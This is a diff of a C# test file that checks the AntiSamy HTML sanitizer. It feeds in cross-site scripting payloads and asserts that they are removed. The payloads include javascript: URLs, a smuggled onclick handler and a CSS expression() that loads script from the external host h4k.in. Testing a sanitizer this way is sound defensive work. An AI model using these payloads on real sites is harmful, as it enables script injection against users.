@@ -121,7 +121,7 @@ namespace AntiSamyTests
             antisamy.Scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy).GetCleanHtml().Should().NotContain("javascript");
             antisamy.Scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy).GetCleanHtml()
                 .Should().NotContain("document");
-            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"javascript:alert('XSS')\");'></dIv>", policy).GetCleanHtml().Should().Contain("style=''");
+            antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"javascript:alert(1)\");'></dIv>", policy).GetCleanHtml().Should().Contain("style=''");
             antisamy.Scan("<dIv/sTyLe='background-image: url(sheep.png), url(\"https://safe.com/kitten.jpg\");'></dIv>", policy).GetCleanHtml()
                 .Should().ContainAll("sheep.png", "kitten.jpg");
             antisamy.Scan("<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>", policy).GetCleanHtml().Should().Be("<a href=\"http://example.com\" rel=\"nofollow\">foo</a>");
